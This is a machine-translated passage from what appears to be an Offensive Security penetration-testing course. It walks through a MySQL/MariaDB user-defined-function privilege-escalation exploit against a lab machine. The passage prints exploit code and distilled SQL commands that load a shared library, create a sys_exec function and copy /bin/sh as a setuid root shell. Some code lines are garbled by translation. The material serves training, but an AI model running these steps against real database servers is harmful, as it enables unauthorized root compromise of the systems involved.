<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:197122;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL UDF 利用    </font></font></b></nobr></div>
<div style="position:absolute;top:197122;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">docs/english/44139-mysql-udf-exploitation.pdf</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:197139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL：安全的 Web 应用程序 - SQL Injectio | </font><font style="vertical-align: inherit;">论文/英文/12945-mysql-secure-web-apps---s</font></font></nobr></div>
<div style="position:absolute;top:197156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对该领域的新贡献- Ho | </font><font style="vertical-align: inherit;">docs/english/40143-novel-contributions-to-the-</font></font></nobr></div>
<div style="position:absolute;top:197173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:197190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- --------- --------------------------</font></font></nobr></div>
<div style="position:absolute;top:197210;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 905 - MySQL 的 SearchSploit </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:197383;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="167"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 167 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:197416;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:198493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:198493;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:198493;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">784</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:197512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在搜索 MySQL 漏洞时，我们必须稍微改变我们的方法。</font><font style="vertical-align: inherit;">这次我们是</font></font></nobr></div>
<div style="position:absolute;top:197531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不寻找可能容易受到攻击的确切版本号，因为 MariaDB 和</font></font></nobr></div>
<div style="position:absolute;top:197550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 使用不同的版本号。</font><font style="vertical-align: inherit;">相反，我们试图看看我们是否可以在</font></font></nobr></div>
<div style="position:absolute;top:197570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公开披露的漏洞利用可能表明我们可以使用的攻击类型。</font></font></nobr></div>
<div style="position:absolute;top:197603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们注意到“UDF”和“用户定义”这两个词经常出现。</font><font style="vertical-align: inherit;">让我们来看看最近的</font></font></nobr></div>
<div style="position:absolute;top:197622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 /usr/share/exploitdb/exploits/linux/local/46249.py 中发现的 UDF 漏洞。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:197657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 # Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local pr</font></font></nobr></div>
<div style="position:absolute;top:197674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限升级利用</font></font></nobr></div>
<div style="position:absolute;top:197691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 # 日期：24/01/2019</font></font></nobr></div>
<div style="position:absolute;top:197708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 ...</font></font></nobr></div>
<div style="position:absolute;top:197725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19 参考文献：</font></font></nobr></div>
<div style="position:absolute;top:197742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20 https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html</font></font></nobr></div>
<div style="position:absolute;top:197758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21 https://www.exploit-db.com/exploits/1518</font></font></nobr></div>
<div style="position:absolute;top:197776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/papers/44139/</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - Osanda Malith 利用 MySQL UDF</font></font></nobr></div>
<div style="position:absolute;top:197793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jayathissa（@OsandaMalith）</font></font></nobr></div>
<div style="position:absolute;top:197812;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 906 - MySQL 漏洞利用 46249 标头</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:197841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该漏洞利用首先参考了对 UDF 漏洞利用的其他研究，包括一篇关于</font></font></nobr></div>
<div style="position:absolute;top:197861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主题。</font></font></nobr></div>
<div style="position:absolute;top:197893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回顾这篇论文告诉我们用户定义函数 (UDF) 类似于自定义插件</font></font></nobr></div>
<div style="position:absolute;top:197913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 MySQL。</font><font style="vertical-align: inherit;">它允许数据库管理员创建自定义的可重复函数来完成</font></font></nobr></div>
<div style="position:absolute;top:197932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体的目标。</font><font style="vertical-align: inherit;">对我们来说方便的是，UDF 是用 C 或 C++ </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">731</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编写的，</font><font style="vertical-align: inherit;">几乎可以运行任何</font></font></nobr></div>
<div style="position:absolute;top:197952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们想要的代码，包括系统命令。</font></font></nobr></div>
<div style="position:absolute;top:197984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">研究人员发现了如何使用标准 MySQL（和 MariaDB）功能来创建</font></font></nobr></div>
<div style="position:absolute;top:198004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些插件以可用于利用系统的方式。</font><font style="vertical-align: inherit;">这个特定的漏洞利用讨论使用</font></font></nobr></div>
<div style="position:absolute;top:198023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDF 作为提升主机权限的方法。</font><font style="vertical-align: inherit;">但是，我们应该能够使用相同的</font></font></nobr></div>
<div style="position:absolute;top:198042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得初始shell的原则。</font><font style="vertical-align: inherit;">需要进行一些修改，但在我们开始更改之前</font></font></nobr></div>
<div style="position:absolute;top:198062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">什么，让我们来看看代码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode_x32 = "7f454c4601010100000000000000000...";</font></font></font></b></nobr></div>
<div style="position:absolute;top:198113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode_x64 = "7f454c4602010100000000000000000...";</font></font></font></b></nobr></div>
<div style="position:absolute;top:198130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42</font></font></nobr></div>
<div style="position:absolute;top:198147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43 shellcode = shellcode_x32</font></font></nobr></div>
<div style="position:absolute;top:198165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44 if (platform.architecture()[0] == '64bit'):</font></font></nobr></div>
<div style="position:absolute;top:198181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45 shellcode = shellcode_x64</font></font></nobr></div>
<div style="position:absolute;top:198198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:198215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd='mysql -u root -p\'' + 密码 + '\' -e "select @@plugin_dir \G"'</font></font></font></b></nobr></div>
<div style="position:absolute;top:198232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72 plugin_str = subprocess.check_output（cmd，shell=True）</font></font></nobr></div>
<div style="position:absolute;top:198249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73 plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)</font></font></nobr></div>
<div style="position:absolute;top:198266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">74 res = bool（plugin_dir）</font></font></nobr></div>
<div style="position:absolute;top:198283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:198300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">91 打印“正在尝试创建 udf 库...”；</font></font></nobr></div>
<div style="position:absolute;top:198317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">92   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">os.system('mysql -u root -p\'' + 密码 + '\' -e "选择二进制 0x' + shellcode</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:198334;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ ' 转储文件 \'%s\' \G"' % udf_outfile)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">93 res = os.path.isfile(udf_outfile)</font></font></nobr></div>
<div style="position:absolute;top:198368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:198385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">99 打印“UDF 库成功创建：%s”% udf_outfile;</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:198443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">731 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（MariaDB，2020），https://mariadb.com/kb/en/create-function-udf/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:198571;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="168"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 168 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:198604;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:199681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:199681;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:199681;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">785</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">100 打印“试图创建 sys_exec...”</font></font></nobr></div>
<div style="position:absolute;top:198716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">101   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">os.system('mysql -u root -p\'' + 密码 + '\' -e "创建函数 sys_exec retu</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:198733;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rns int soname \'%s\'\G"' % udf_filename)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">102</font></font></nobr></div>
<div style="position:absolute;top:198768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">103 打印“检查 sys_exec 是否已装箱...”</font></font></nobr></div>
<div style="position:absolute;top:198784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">104   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd='mysql -u root -p\'' + 密码 + '\' -e "select * from mysql.func where name</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:198801;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=\'sys_exec\' \G"';</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">105 res = subprocess.check_output（cmd，shell=True）；</font></font></nobr></div>
<div style="position:absolute;top:198835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:198852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110 如果资源：</font></font></nobr></div>
<div style="position:absolute;top:198869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111    </font></font></nobr></div>
<div style="position:absolute;top:198869;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“找到 sys_exec：%s”% res</font></font></nobr></div>
<div style="position:absolute;top:198886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">112    </font></font></nobr></div>
<div style="position:absolute;top:198886;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“在 /tmp/sh 中生成 suid 二进制文件...”</font></font></nobr></div>
<div style="position:absolute;top:198903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">113    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:198903;left:214"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">os.system('mysql -u root -p\'' + 密码 + '\' -e "select sys_exec(\'cp</font></font></b></nobr></div>
<div style="position:absolute;top:198920;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/sh /tmp/; </font><font style="vertical-align: inherit;">chown root:root /tmp/sh; </font><font style="vertical-align: inherit;">chmod +s /tmp/sh\')"')</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">114</font></font></nobr></div>
<div style="position:absolute;top:198954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">115    </font></font></nobr></div>
<div style="position:absolute;top:198954;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“试图产生一个根壳......”</font></font></nobr></div>
<div style="position:absolute;top:198971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">116    </font></font></nobr></div>
<div style="position:absolute;top:198971;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pty.spawn("/tmp/sh");</font></font></nobr></div>
<div style="position:absolute;top:198990;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 907 - MySQL 漏洞利用 46249</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们注意到的第一件事是第 40-45 行定义的 shellcode 变量。</font><font style="vertical-align: inherit;">第 71 行的 SQL 查询</font></font></nobr></div>
<div style="position:absolute;top:199039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取插件目录（请记住，这是我们发现的不是 Zora 标准的变量）。</font></font></nobr></div>
<div style="position:absolute;top:199058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，在第 92 行，代码将 shellcode 二进制内容转储到插件目录中的文件中。</font></font></nobr></div>
<div style="position:absolute;top:199078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 101 行</font><font style="vertical-align: inherit;">利用上传的二进制文件</font><font style="vertical-align: inherit;">创建了一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的函数</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">最后，脚本</font></font></nobr></div>
<div style="position:absolute;top:199097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查该函数是否在第 104 行成功创建，如果是这种情况，则该函数为</font></font></nobr></div>
<div style="position:absolute;top:199116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在第 113 行执行。阅读有关 MySQL </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CREATE FUNCTION</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法的</font><font style="vertical-align: inherit;">更多信息</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">732</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议</font></font></nobr></div>
<div style="position:absolute;top:199136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode 变量的二进制内容应该是一个共享库，它实现了</font></font></nobr></div>
<div style="position:absolute;top:199155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并导出我们要在数据库中创建的函数。</font></font></nobr></div>
<div style="position:absolute;top:199188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本质上，整个脚本只运行五个命令。</font><font style="vertical-align: inherit;">如果我们将代码精简到其本质</font></font></nobr></div>
<div style="position:absolute;top:199207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL命令，我们获得以下内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:199242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择@@plugin_dir</font></font></nobr></div>
<div style="position:absolute;top:199259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择二进制 0xshellcode 到转储文件@@plugin_dir;</font></font></nobr></div>
<div style="position:absolute;top:199276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建函数 sys_exec 返回 int soname udf_filename;</font></font></nobr></div>
<div style="position:absolute;top:199293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from mysql.func where name='sys_exec' \G</font></font></nobr></div>
<div style="position:absolute;top:199310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')</font></font></nobr></div>
<div style="position:absolute;top:199329;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 908 - MySQL 漏洞利用分解</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们已经有了一个交互式 MariaDB shell，理论上我们可以运行这些命令</font></font></nobr></div>
<div style="position:absolute;top:199378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接在 MariaDB shell 中对抗 Zora。</font><font style="vertical-align: inherit;">但是，我们要确保我们了解我们</font></font></nobr></div>
<div style="position:absolute;top:199397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前即将执行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:199432;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:199432;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">试图利用数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然个别命令让我们没有理由担心，但我们不知道 shellcode 是什么</font></font></nobr></div>
<div style="position:absolute;top:199489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是在做。</font><font style="vertical-align: inherit;">相反，我们将用我们可以控制的东西替换 shellcode。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:199509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 raptor_udf.c 的漏洞利用状态中的引用。</font><font style="vertical-align: inherit;">快速的谷歌搜索揭示了一个相关的</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:199631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">732 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（甲骨文公司，2020 年），https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:199759;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="169"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 169 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:199792;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:200869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:200869;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:200869;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">786</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用数据库条目</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">733</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和评论底部的注释提到了 GitHub 项目</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">734</font></font></font></nobr></div>
<div style="position:absolute;top:199907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这看起来很有希望。</font></font></nobr></div>
<div style="position:absolute;top:199940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们下载代码，查看并编译它。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:199975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">git clone https://github.com/mysqludf/lib_mysqludf_sys.git</font></font></font></b></nobr></div>
<div style="position:absolute;top:199992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克隆到'lib_mysqludf_sys'...</font></font></nobr></div>
<div style="position:absolute;top:200009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:200043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd lib_mysqludf_sys/</font></font></font></b></nobr></div>
<div style="position:absolute;top:200060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/lib_mysqludf_sys$ </font></font></nobr></div>
<div style="position:absolute;top:200079;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 909 - 从 GitHub 下载代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:200108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开 lib_mysqludf_sys.c 文件向我们展示了一个相当标准的 UDF 库，它允许</font></font></nobr></div>
<div style="position:absolute;top:200128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 C/C++</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">执行系统命令</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">735</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:200179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">my_ulonglong sys_exec(</font></font></nobr></div>
<div style="position:absolute;top:200196;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDF_INIT *initid</font></font></nobr></div>
<div style="position:absolute;top:200214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, UDF_ARGS *args</font></font></nobr></div>
<div style="position:absolute;top:200231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 字符 *is_null</font></font></nobr></div>
<div style="position:absolute;top:200248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 字符 * 错误</font></font></nobr></div>
<div style="position:absolute;top:200264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">){</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:200281;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回系统(args-&gt;args[0]);</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:200315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:200335;left:298"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 910 - sys_exec UDF 函数实现</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:200364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而且，根据代码，共享库编译后导出的函数是</font></font></nobr></div>
